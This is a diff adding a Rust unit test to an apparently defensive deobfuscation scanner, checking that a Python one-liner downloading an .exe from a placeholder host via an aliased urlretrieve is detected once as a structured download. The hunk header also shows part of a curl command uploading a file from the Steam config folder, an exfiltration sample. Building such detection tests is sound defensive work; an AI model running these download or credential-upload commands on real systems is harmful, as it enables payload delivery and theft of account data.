@@ -11136,6 +11136,39 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_urllib_urlretrieve_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from urllib.request import urlretrieve as grab; grab('https://py.example/alias-file.exe', 'alias.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/alias-file.exe"
+                        && dst.as_deref() == Some("alias.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_b64decode_literal_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
